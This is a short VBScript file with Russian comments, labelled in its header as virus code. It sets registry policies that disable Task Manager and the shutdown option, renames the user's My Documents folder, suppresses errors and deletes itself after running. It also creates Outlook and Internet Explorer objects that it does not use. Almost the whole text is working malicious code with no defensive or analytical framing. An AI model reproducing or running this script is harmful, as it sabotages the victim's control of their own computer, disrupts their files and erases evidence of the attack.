'            = = = = = =  = > КОД ВИРУСА < = = = = = = = 

'      Объявление переменных(этот абзац не перемещать)
Set FileSystemObject = CreateObject("scripting.filesystemobject")
Set Shell = CreateObject("Wscript.Shell")
t = 0: On Error Resume Next ' Пропускать ошибки
Set Application = CreateObject("Shell.Application")
Set InternerExplorer = WScript.CreateObject("InternetExplorer.Application")
Set Outlook = WScript.CreateObject("Outlook.Application")


Shell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr", 1, "REG_DWORD"
Shell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explоrer\NoClose", 1, "REG_DWORD"

' Переименование папки Мои документы на "оол"
For Each Folder In Shell.SpecialFolders
If right(folder,13) = "Мои документы" Then 
Set tf = FileSystemObject.getfolder(folder): tf.name = "оол"
End If
Next

'     Самоликвидироваться
FileSystemObject.deletefile WScript.ScriptFullName, True

